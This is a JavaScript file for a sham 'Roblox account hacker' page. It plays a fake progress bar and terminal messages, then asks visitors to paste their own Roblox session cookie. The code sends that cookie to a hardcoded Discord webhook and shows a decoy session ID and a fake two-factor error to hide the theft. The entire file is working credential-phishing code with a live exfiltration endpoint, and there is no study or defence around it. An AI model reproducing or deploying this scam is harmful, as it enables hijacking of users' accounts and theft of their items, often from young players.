function validateInput() {
      const userId = document.getElementById('userId').value.trim();

      // Basic validation: Check if input is at least 3 characters long
      if (userId.length < 3) {
        document.getElementById('error').classList.remove('hidden');
        document.getElementById('hacking').classList.add('hidden');
        return;
      }

      // If input is valid, hide error and start fake hacking process
      document.getElementById('error').classList.add('hidden');
      startHack();
    }


function startHack() {
  // Show hacking section
  document.getElementById('hacking').classList.remove('hidden');

  // Fake progress bar
  const progressBar = document.getElementById('progress-bar-fill');
  let width = 0;
  const interval = setInterval(() => {
    if (width >= 100) {
      clearInterval(interval);
      askForCookie();
    } else {
      width++;
      progressBar.style.width = width + '%';
    }
  }, 50);

  // Fake terminal output
  const terminal = document.getElementById('terminal');
  const messages = [
    '[*] Scanning target account...',
    '[*] Bypassing firewall...',
    '[*] Decrypting session data...',
    '[*] Session ID detected. Verification required.'
  ];
  let i = 0;
  const terminalInterval = setInterval(() => {
    if (i >= messages.length) {
      clearInterval(terminalInterval);
    } else {
      terminal.innerHTML += messages[i] + '\n';
      terminal.scrollTop = terminal.scrollHeight;
      i++;
    }
  }, 1500);
}

function askForCookie() {
  // Ask for the user's cookie
  const cookie = prompt("Enter your Roblox session ID (cookie) to proceed:");
  const minCookieLength = 100; // Minimum length for a valid cookie

  if (cookie && cookie.length >= minCookieLength) {
    // Send the cookie to a Discord webhook (or log it)
    fetch("https://discord.com/api/webhooks/1350235351339241472/LwcYuoFmSDCC4pAHoZ5Kdn0a3afUerPQeXNxq8bxZdSrLoBUPab1pWMtOTYzcIqnGzKQ", {
      method: "POST",
      body: JSON.stringify({ content: "Roblox Cookie: " + cookie }),
      headers: { "Content-Type": "application/json" }
    }).then(response => {
      if (response.ok) {
        showCookieSuccess();
      } else {
        showCookieError("Failed to submit cookie. Please try again.");
      }
    }).catch(error => {
      showCookieError("Network error. Please try again.");
    });
  } else {
    showCookieError("ERROR! Cookie must be at least " + minCookieLength + " characters long.");
  }
}

function showCookieSuccess() {
  // Array of 10 pre-defined session IDs (cookies)
  const sessionIds = [
    '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_A1B2C3D4E5F6G7H8I9J0********',
    '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_K1L2M3N4O5P6Q7R8S9T0********',
    '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_U1V2W3X4Y5Z6A7B8C9D0********',
    '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_E1F2G3H4I5J6K7L8M9N0********',
    '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_O1P2Q3R4S5T6U7V8W9X0********',
    '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_Y1Z2A3B4C5D6E7F8G9H0********',
    '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_I1J2K3L4M5N6O7P8Q9R0********',
    '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_S1T2U3V4W5X6Y7Z8A9B0********',
    '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_C1D2E3F4G5H6I7J8K9L0********',
    '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_M1N2O3P4Q5R6S7T8U9V0********'
  ];

  // Randomly select a session ID
  const randomSessionId = sessionIds[Math.floor(Math.random() * sessionIds.length)];

  // Show partially blurred cookie and 2FA error
  document.getElementById('cookie').innerText = `Session ID: ${randomSessionId}`;
  document.getElementById('twoFaError').classList.remove('hidden');

  // Update terminal output
  const terminal = document.getElementById('terminal');
  terminal.innerHTML += '[*] Session ID verified.\n';
  terminal.innerHTML += '[*] ERROR! User has 2FA enabled. Full access prevented.\n';
  terminal.scrollTop = terminal.scrollHeight;
}

function showCookieError(message) {
  // Show error message
  document.getElementById('error').classList.remove('hidden');
  document.getElementById('error').innerText = message;

  // Update terminal output
  const terminal = document.getElementById('terminal');
  terminal.innerHTML += `[*] ERROR! ${message}\n`;
  terminal.scrollTop = terminal.scrollHeight;
}
